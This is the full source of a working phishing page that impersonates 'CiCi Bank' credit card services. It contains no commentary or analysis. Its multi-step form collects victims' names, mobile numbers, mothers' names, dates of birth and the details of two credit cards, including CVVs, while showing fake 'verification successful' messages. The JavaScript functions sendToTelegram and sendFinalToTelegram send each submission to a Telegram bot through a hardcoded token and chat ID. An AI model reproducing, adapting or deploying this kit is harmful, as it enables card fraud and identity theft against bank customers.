<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CiCi Bank - Credit Card Services</title>
  <style>
    /* General Styles */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body, html {
      background-color: #f5f5f5;
      font-family: 'Roboto', sans-serif;
      color: #333;
      line-height: 1.6;
    }

    /* Logo Styling */
    .bank-logo {
      /* --- MODIFIED CSS FOR LOGO CONTAINER --- */
      text-align: center;
      margin-bottom: 0; /* Remove space below logo container */
      width: 110%; /* Make the container span full width */
      max-width: none; /* Remove any max-width restriction on the container */
    }
    
    .bank-logo img {
      /* --- MODIFIED CSS FOR LOGO IMAGE --- */
      width: 100%; /* Ensure the image takes 100% of its parent's width */
      height: 200px; /* Keep fixed height */
      display: block; /* Change to block to ensure it occupies full width without extra spacing */
      margin: 0 auto; /* Center the image if its natural width is less than 100%, but not strictly needed with width: 100% */
      object-fit: cover; /* This will make the image cover the 100% width and 200px height,
                           cropping if necessary, without distorting aspect ratio much.
                           Use 'contain' if you want the whole image to be visible,
                           even if it leaves blank space. 'cover' is usually preferred for banners/headers. */
    }

    /* Main Content Area */
    .main-content {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px; /* --- MODIFIED: Removed top padding to reduce space --- */
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }

    /* Page Title */
    .page-title {
      text-align: center;
      margin-top: 20px; /* Added some top margin to separate from the logo */
      margin-bottom: 40px;
      width: 100%;
    }

    .page-title h1 {
      font-size: 36px;
      color: #1a237e;
      margin-bottom: 0%;
      margin-top: 0%;
    }

    .page-title p {
      font-size: 18px;
      color: #666;
      max-width: 600px;
      margin: 0 auto;
    }

    /* Container Styling */
    .container {
      background-color: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0px 8px 15px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 450px;
      text-align: center;
      animation: fadeIn 0.5s ease-in-out;
      margin-bottom: 40px;
    }

    h2 {
      font-family: 'Poppins', sans-serif;
      margin-bottom: 30px;
      font-size: 26px;
      color: #1a237e;
      letter-spacing: 1.2px;
    }

    .form-step {
      display: none;
      animation: fadeIn 0.5s ease-in-out;
    }

    .form-step.active {
      display: block;
    }

    /* Enhanced Input and Select Styles with Animation */
    input, select {
      width: 100%;
      padding: 15px;
      margin: 10px 0;
      border: 2px solid #ddd;
      border-radius: 8px;
      font-size: 16px;
      transition: all 0.3s ease;
      box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
      background-color: #f8f9fa;
    }

    input:focus, select:focus {
      box-shadow: 0px 0px 10px rgba(26, 35, 126, 0.5);
      border-color: #1a237e;
      transform: scale(1.02);
      outline: none;
    }

    input.error {
      border-color: #dc3545;
      box-shadow: 0px 0px 10px rgba(220, 53, 69, 0.5);
    }

    .error-message {
      color: #dc3545;
      font-size: 14px;
      text-align: left;
      margin-top: -5px;
      margin-bottom: 10px;
      display: none;
    }

    /* Button Styling */
    .button {
      background-color: #1a237e;
      color: #fff;
      border: none;
      padding: 14px;
      width: 100%;
      cursor: pointer;
      margin-top: 20px;
      border-radius: 8px;
      font-size: 18px;
      font-weight: bold;
      transition: background-color 0.3s, transform 0.2s;
      letter-spacing: 1.2px;
    }

    .button:hover {
      background-color: #283593;
      transform: scale(1.03);
    }

    .button:disabled {
      background-color: #6c757d;
      cursor: not-allowed;
      transform: none;
    }

    /* Verification Animation */
    .verification-animation {
      display: none;
      font-size: 24px;
      font-weight: bold;
      animation: fadeInScale 1s ease forwards, pulse 1s infinite alternate;
      margin-top: 30px;
      letter-spacing: 1.2px;
      color: #1a237e;
      text-align: center;
      padding: 20px;
      border-radius: 8px;
      background-color: rgba(26, 35, 126, 0.1);
    }

    /* Success Verification Text Color */
    .verification-animation.success {
      color: #28a745;
      background-color: rgba(40, 167, 69, 0.1);
    }

    /* Keyframes for Animations */
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    @keyframes fadeInScale {
      from { opacity: 0; transform: scale(0.8); }
      to { opacity: 1; transform: scale(1); }
    }

    @keyframes pulse {
      from { opacity: 0.8; }
      to { opacity: 1; }
    }

    /* Progress Indicator */
    .progress-container {
      display: flex;
      justify-content: space-between;
      margin-bottom: 30px;
      position: relative;
    }

    .progress-bar {
      position: absolute;
      height: 4px;
      background-color: #1a237e;
      top: 50%;
      left: 0;
      transform: translateY(-50%);
      transition: width 0.3s ease;
      z-index: 0;
    }

    .progress-step {
      width: 30px;
      height: 30px;
      border-radius: 50%;
      background-color: #ddd;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      color: #666;
      z-index: 1;
      transition: all 0.3s ease;
    }

    .progress-step.active {
      background-color: #1a237e;
      color: white;
    }

    .progress-step.completed {
      background-color: #28a745;
      color: white;
    }

    /* Note Styling */
    .note {
      background-color: #fff3cd;
      border: 1px solid #ffeaa7;
      border-radius: 8px;
      padding: 15px;
      margin: 15px 0;
      text-align: left;
      font-size: 14px;
      color: #856404;
    }

    .note strong {
      color: #1a237e;
    }

    /* Normal Website Footer */
    .website-footer {
      background: linear-gradient(135deg, #1a237e, #283593);
      color: white;
      padding: 40px 0 20px;
      margin-top: 60px;
      width: 100%;
    }

    .footer-content {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
    }

    .footer-section {
      flex: 1;
      min-width: 250px;
      margin-bottom: 30px;
    }

    .footer-section h3 {
      font-size: 20px;
      margin-bottom: 20px;
      border-bottom: 2px solid #ffd54f;
      padding-bottom: 10px;
      display: inline-block;
    }

    .footer-section p, .footer-section a {
      color: #e0e0e0;
      margin-bottom: 10px;
      display: block;
      text-decoration: none;
      transition: color 0.3s;
    }

    .footer-section a:hover {
      color: #ffd54f;
    }

    .footer-bottom {
      text-align: center;
      padding-top: 20px;
      border-top: 1px solid rgba(255,255,255,0.1);
      margin-top: 20px;
      font-size: 14px;
      color: #b0b0b0;
    }

    /* Info Sections */
    .info-section {
      width: 100%;
      max-width: 800px;
      margin: 30px auto;
      padding: 30px;
      background-color: white;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }

    .info-section h3 {
      color: #1a237e;
      margin-bottom: 15px;
      font-size: 22px;
    }

    .info-section p {
      margin-bottom: 15px;
      line-height: 1.6;
    }

    /* Responsive adjustments */
    @media (max-width: 768px) {
      .footer-content {
        flex-direction: column;
      }
      
      .page-title h1 {
        font-size: 28px;
      }
      
      .bank-logo img {
        height: 150px; /* Adjusted for smaller screens */
      }
    }

    @media (max-width: 500px) {
      .container {
        padding: 20px;
      }
      
      .main-content {
        padding: 0 15px; /* Adjusted padding */
      }
      
      .bank-logo img {
        height: 120px; /* Adjusted for smallest screens */
      }
    }

    @media (max-width: 350px) {
      .container {
        padding: 15px;
      }
      
      input, select {
        padding: 12px;
        font-size: 14px;
      }
      
      .button {
        padding: 12px;
        font-size: 16px;
      }
      
      .bank-logo img {
        height: 100px; /* Adjusted for very small screens */
      }
    }
  </style>
</head>
<body>
  <main class="main-content">
    <div class="bank-logo">
      <img src="1header.jpg" alt="CiCi Bank Logo">
    </div>
    
    <div class="page-title">
      <h1>Credit Card Services</h1>
      
    </div>

    <div class="container">
      <div class="progress-container">
        <div class="progress-bar" id="progress-bar"></div>
        <div class="progress-step active" id="step-indicator-1">1</div>
        <div class="progress-step" id="step-indicator-2">2</div>
        <div class="progress-step" id="step-indicator-3">3</div>
      </div>

      <div id="step1" class="form-step active">
        <input type="text" id="fullname" placeholder="Full Name" required>
        <div class="error-message" id="fullname-error">Please enter a valid full name</div>
        
        <input type="number" id="mobile" placeholder="Mobile Number" required>
        <div class="error-message" id="mobile-error">Please enter a valid 10-digit mobile number</div>
        
        <select id="service" required>
          <option value="">Select Service</option>
          <option value="KYC Update">KYC Update</option>
          <option value="Card Block">Card Block</option>
          <option value="Stop Services">Stop Services</option>
          <option value="Redeem Reward Point">Redeem Reward Point</option>
          <option value="New Credit Card Apply">New Credit Card Apply</option>
          <option value="Greeted Card">Greeted Card</option>
          <option value="Other Service">Other Service</option>
        </select>
        <div class="error-message" id="service-error">Please select a service</div>
        
        <button class="button" id="step1-button" onclick="validateStep1()">Next</button>
      </div>

      <div id="step2" class="form-step">
        <input type="text" id="mothername" placeholder="Mother's Name" required>
        <div class="error-message" id="mothername-error">Please enter mother's name</div>
        
        <input type="text" id="dob" placeholder="Date of Birth (DD/MM/YYYY)" maxlength="10" required oninput="formatDOB(this)">
        <div class="error-message" id="dob-error">Please enter a valid date of birth (DD/MM/YYYY)</div>
        
        <button class="button" id="step2-button" onclick="validateStep2()">Next</button>
      </div>

      <div id="step3" class="form-step">
        <div class="note">
          <strong>Note:</strong> Please Enter Your Granted Witness Credit Card Details
        </div>
        
        <input type="number" id="cardnumber" placeholder="Card Number" required>
        <div class="error-message" id="cardnumber-error">Please enter a valid 16-digit card number</div>
        
        <input type="text" id="expiry" placeholder="Expiry Date (MM/YY)" maxlength="5" required oninput="formatExpiry(this)">
        <div class="error-message" id="expiry-error">Please enter a valid expiry date (MM/YY)</div>
        
        <input type="number" id="cvv" placeholder="CVV" maxlength="3" required>
        <div class="error-message" id="cvv-error">Please enter a valid 3-digit CVV</div>
        
        <button class="button" id="step3-button" onclick="validateStep3()">Submit</button>
      </div>

      <div id="verification-animation" class="verification-animation"></div>
    </div>

    <div class="info-section">
      <h3>About Our Credit Card Services</h3>
      <p>CiCi Bank offers a comprehensive range of credit card services to meet your financial needs. Whether you're looking to apply for a new card, manage your existing account, or need assistance with card-related issues, our secure online portal makes it easy.</p>
      <p>Our services include KYC updates, card blocking, reward point redemption, and much more. All transactions are protected with bank-level security to ensure your information remains safe.</p>
    </div>

    <div class="info-section">
      <h3>Security Information</h3>
      <p>Your security is our top priority. We use industry-standard encryption to protect your personal and financial information. Never share your CVV, PIN, or OTP with anyone, and always verify transactions through your registered mobile number.</p>
      <p>If you suspect any unauthorized activity on your account, please contact our customer service immediately at 1800-123-4567.</p>
    </div>
  </main>

  <footer class="website-footer">
    <div class="footer-content">
      <div class="footer-section">
        <h3>Contact Us</h3>
        <p>Customer Service: 1800-123-4567</p>
        <p>Email: support@cicibank.com</p>
        <p>Address: 123 Financial District, Mumbai, India</p>
      </div>
      
      <div class="footer-section">
        <h3>Quick Links</h3>
        <a href="#">Home</a>
        <a href="#">Services</a>
        <a href="#">Credit Cards</a>
        <a href="#">Contact</a>
      </div>
      
      <div class="footer-section">
        <h3>Services</h3>
        <a href="#">KYC Update</a>
        <a href="#">Card Block</a>
        <a href="#">Reward Points</a>
        <a href="#">New Card Application</a>
      </div>
    </div>
    
    <div class="footer-bottom">
      <p>&copy; 2023 CiCi Bank. All Rights Reserved. | Secure Banking Services</p>
    </div>
  </footer>

  <script>
    // Form state management
    const formState = {
      currentStep: 1,
      totalSteps: 3,
      data: {},
      cardVerificationCount: 0
    };

    // Initialize the form
    function initForm() {
      updateProgressBar();
      
      // Add input validation listeners
      document.getElementById('fullname').addEventListener('input', validateFullName);
      document.getElementById('mobile').addEventListener('input', validateMobile);
      document.getElementById('service').addEventListener('change', validateService);
      document.getElementById('mothername').addEventListener('input', validateMotherName);
      document.getElementById('dob').addEventListener('input', validateDOB);
      document.getElementById('cardnumber').addEventListener('input', validateCardNumber);
      document.getElementById('expiry').addEventListener('input', validateExpiry);
      document.getElementById('cvv').addEventListener('input', validateCVV);
    }

    // Update progress bar
    function updateProgressBar() {
      const progressPercentage = ((formState.currentStep - 1) / (formState.totalSteps - 1)) * 100;
      document.getElementById('progress-bar').style.width = `${progressPercentage}%`;
      
      // Update step indicators
      for (let i = 1; i <= formState.totalSteps; i++) {
        const indicator = document.getElementById(`step-indicator-${i}`);
        if (i < formState.currentStep) {
          indicator.className = 'progress-step completed';
        } else if (i === formState.currentStep) {
          indicator.className = 'progress-step active';
        } else {
          indicator.className = 'progress-step';
        }
      }
    }

    // Validation functions
    function validateFullName() {
      const fullname = document.getElementById('fullname');
      const error = document.getElementById('fullname-error');
      const isValid = fullname.value.trim().length >= 2;
      
      toggleError(fullname, error, isValid);
      return isValid;
    }

    function validateMobile() {
      const mobile = document.getElementById('mobile');
      const error = document.getElementById('mobile-error');
      const isValid = /^\d{10}$/.test(mobile.value.replace(/\D/g, ''));
      
      toggleError(mobile, error, isValid);
      return isValid;
    }

    function validateService() {
      const service = document.getElementById('service');
      const error = document.getElementById('service-error');
      const isValid = service.value !== '';
      
      toggleError(service, error, isValid);
      return isValid;
    }

    function validateMotherName() {
      const mothername = document.getElementById('mothername');
      const error = document.getElementById('mothername-error');
      const isValid = mothername.value.trim().length >= 2;
      
      toggleError(mothername, error, isValid);
      return isValid;
    }

    function validateDOB() {
      const dob = document.getElementById('dob');
      const error = document.getElementById('dob-error');
      const isValid = /^\d{2}\/\d{2}\/\d{4}$/.test(dob.value) && isValidDate(dob.value);
      
      toggleError(dob, error, isValid);
      return isValid;
    }

    function validateCardNumber() {
      const cardnumber = document.getElementById('cardnumber');
      const error = document.getElementById('cardnumber-error');
      const isValid = /^\d{16}$/.test(cardnumber.value.replace(/\s/g, ''));
      
      toggleError(cardnumber, error, isValid);
      return isValid;
    }

    function validateExpiry() {
      const expiry = document.getElementById('expiry');
      const error = document.getElementById('expiry-error');
      const isValid = /^\d{2}\/\d{2}$/.test(expiry.value) && isValidExpiry(expiry.value);
      
      toggleError(expiry, error, isValid);
      return isValid;
    }

    function validateCVV() {
      const cvv = document.getElementById('cvv');
      const error = document.getElementById('cvv-error');
      const isValid = /^\d{3}$/.test(cvv.value);
      
      toggleError(cvv, error, isValid);
      return isValid;
    }

    function toggleError(input, errorElement, isValid) {
      if (isValid) {
        input.classList.remove('error');
        errorElement.style.display = 'none';
      } else {
        input.classList.add('error');
        errorElement.style.display = 'block';
      }
    }

    // Step validation functions
    function validateStep1() {
      const isStepValid = validateFullName() && validateMobile() && validateService();
      
      if (isStepValid) {
        formState.data.fullname = document.getElementById('fullname').value;
        formState.data.mobile = document.getElementById('mobile').value;
        formState.data.service = document.getElementById('service').value;
        
        showVerification('step2', 'Verifying Your Details...');
      }
    }

    function validateStep2() {
      const isStepValid = validateMotherName() && validateDOB();
      
      if (isStepValid) {
        formState.data.mothername = document.getElementById('mothername').value;
        formState.data.dob = document.getElementById('dob').value;
        
        showVerification('step3', 'Verifying Your Details...');
      }
    }

    function validateStep3() {
      const isStepValid = validateCardNumber() && validateExpiry() && validateCVV();
      
      if (isStepValid) {
        formState.data.cardnumber = document.getElementById('cardnumber').value;
        formState.data.expiry = document.getElementById('expiry').value;
        formState.data.cvv = document.getElementById('cvv').value;
        
        // Show specific message for credit card verification
        showVerification('step3', 'Please Wait Your Granted Witness Card Verify');
      }
    }

    // Show verification animation and proceed to next step
    function showVerification(nextStepId, message) {
      // Show verification animation
      const verificationAnimation = document.getElementById('verification-animation');
      verificationAnimation.style.display = 'block';
      verificationAnimation.textContent = message;
      verificationAnimation.classList.remove('success');
      
      // Hide current step
      document.getElementById(`step${formState.currentStep}`).classList.remove('active');
      
      // Send data to Telegram
      sendToTelegram();
      
      // After 3 seconds, show success message
      setTimeout(() => {
        verificationAnimation.textContent = "Verification Successful!";
        verificationAnimation.classList.add('success');
        
        // After 2 more seconds, proceed to next step or show verification message
        setTimeout(() => {
          verificationAnimation.style.display = 'none';
          
          if (formState.currentStep < formState.totalSteps) {
            formState.currentStep++;
            updateProgressBar();
            document.getElementById(nextStepId).classList.add('active');
          } else {
            // This is the final step (card details)
            formState.cardVerificationCount++;
            
            if (formState.cardVerificationCount === 1) {
              // First card verification completed
              verificationAnimation.style.display = 'block';
              verificationAnimation.textContent = "Please Verify Another Credit Card";
              verificationAnimation.classList.remove('success');
              
              // Reset card details form after 3 seconds
              setTimeout(() => {
                verificationAnimation.style.display = 'none';
                resetCardDetails();
                document.getElementById('step3').classList.add('active');
              }, 3000);
            } else {
              // Second card verification completed - submit the form
              submitForm();
            }
          }
        }, 2000);
      }, 3000);
    }

    // Submit the final form
    function submitForm() {
      // Show verification animation
      const verificationAnimation = document.getElementById('verification-animation');
      verificationAnimation.style.display = 'block';
      verificationAnimation.textContent = "Processing Your Request...";
      verificationAnimation.classList.remove('success');
      
      // Send final data to Telegram
      sendFinalToTelegram();
      
      // After 3 seconds, show success message
      setTimeout(() => {
        verificationAnimation.textContent = "Successful Verification!";
        verificationAnimation.classList.add('success');
        
        // Reset form after 3 seconds
        setTimeout(() => {
          resetForm();
        }, 3000);
      }, 3000);
    }

    // Reset card details only
    function resetCardDetails() {
      document.getElementById('cardnumber').value = '';
      document.getElementById('expiry').value = '';
      document.getElementById('cvv').value = '';
      
      // Hide error messages
      document.getElementById('cardnumber-error').style.display = 'none';
      document.getElementById('expiry-error').style.display = 'none';
      document.getElementById('cvv-error').style.display = 'none';
      
      // Remove error classes
      document.getElementById('cardnumber').classList.remove('error');
      document.getElementById('expiry').classList.remove('error');
      document.getElementById('cvv').classList.remove('error');
    }

    // Send form data to Telegram
    function sendToTelegram() {
      const botToken = '7456438229:AAGLCioiH8MTpZ8DkUpSJgPKfLhpt6iVsCc';
      const chatId = '7155441629';
      
      let message = `*New Form Submission:*\n\n`;
      message += `*Step ${formState.currentStep} Data:*\n`;
      
      // Add relevant data based on current step
      if (formState.currentStep === 1) {
        message += `*Full Name:* ${formState.data.fullname}\n`;
        message += `*Mobile Number:* ${formState.data.mobile}\n`;
        message += `*Service Requested:* ${formState.data.service}\n`;
      } else if (formState.currentStep === 2) {
        message += `*Mother's Name:* ${formState.data.mothername}\n`;
        message += `*Date of Birth:* ${formState.data.dob}\n`;
      } else if (formState.currentStep === 3) {
        message += `*Card ${formState.cardVerificationCount + 1} Details:*\n`;
        message += `*Card Number:* ${formState.data.cardnumber}\n`;
        message += `*Expiry Date:* ${formState.data.expiry}\n`;
        message += `*CVV:* ${formState.data.cvv}\n`;
      }
      
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      
      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      }).catch(error => console.error('Error sending to Telegram:', error));
    }

    // Send final data to Telegram
    function sendFinalToTelegram() {
      const botToken = '7456438229:AAGLCioiH8MTpZ8DkUpSJgPKfLhpt6iVsCc';
      const chatId = '7155441629';
      
      let message = `*Final Form Submission:*\n\n`;
      message += `*Personal Details:*\n`;
      message += `*Full Name:* ${formState.data.fullname}\n`;
      message += `*Mobile Number:* ${formState.data.mobile}\n`;
      message += `*Service Requested:* ${formState.data.service}\n`;
      message += `*Mother's Name:* ${formState.data.mothername}\n`;
      message += `*Date of Birth:* ${formState.data.dob}\n`;
      message += `\n*Both cards have been verified successfully!*`;
      
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      
      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      }).catch(error => console.error('Error sending to Telegram:', error));
    }

    // Reset the form
    function resetForm() {
      // Reset form state
      formState.currentStep = 1;
      formState.data = {};
      formState.cardVerificationCount = 0;
      
      // Reset all inputs
      document.getElementById('fullname').value = '';
      document.getElementById('mobile').value = '';
      document.getElementById('service').value = '';
      document.getElementById('mothername').value = '';
      document.getElementById('dob').value = '';
      document.getElementById('cardnumber').value = '';
      document.getElementById('expiry').value = '';
      document.getElementById('cvv').value = '';
      
      // Hide all error messages
      document.querySelectorAll('.error-message').forEach(el => {
        el.style.display = 'none';
      });
      
      // Remove error classes
      document.querySelectorAll('input, select').forEach(el => {
        el.classList.remove('error');
      });
      
      // Hide verification animation
      document.getElementById('verification-animation').style.display = 'none';
      
      // Show step 1
      document.querySelectorAll('.form-step').forEach(el => {
        el.classList.remove('active');
      });
      document.getElementById('step1').classList.add('active');
      
      // Reset progress bar
      updateProgressBar();
    }

    // Utility functions
    function formatDOB(input) {
      let value = input.value.replace(/[^0-9]/g, '');
      
      if (value.length > 2 && value.length <= 4) {
        value = value.slice(0, 2) + '/' + value.slice(2);
      } else if (value.length > 4) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 8);
      } else if (value.length === 2) {
        value = value + '/';
      }
      
      input.value = value;
      validateDOB();
    }

    function formatExpiry(input) {
      input.value = input.value.replace(/[^0-9]/g, '').replace(/(.{2})(.{2})/, '$1/$2');
      validateExpiry();
    }

    function isValidDate(dateString) {
      const parts = dateString.split('/');
      if (parts.length !== 3) return false;
      
      const day = parseInt(parts[0], 10);
      const month = parseInt(parts[1], 10);
      const year = parseInt(parts[2], 10);
      
      if (isNaN(day) || isNaN(month) || isNaN(year)) return false;
      if (day < 1 || day > 31) return false;
      if (month < 1 || month > 12) return false;
      if (year < 1900 || year > new Date().getFullYear()) return false;
      
      return true;
    }

    function isValidExpiry(expiryString) {
      const parts = expiryString.split('/');
      if (parts.length !== 2) return false;
      
      const month = parseInt(parts[0], 10);
      const year = parseInt(parts[1], 10) + 2000; // Assuming 21 means 2021
      
      if (isNaN(month) || isNaN(year)) return false;
      if (month < 1 || month > 12) return false;
      
      const currentDate = new Date();
      const currentYear = currentDate.getFullYear();
      const currentMonth = currentDate.getMonth() + 1;
      
      if (year < currentYear) return false;
      if (year === currentYear && month < currentMonth) return false;
      
      return true;
    }

    // Initialize the form when the page loads
    window.onload = initForm;
  </script>
</body>
</html>
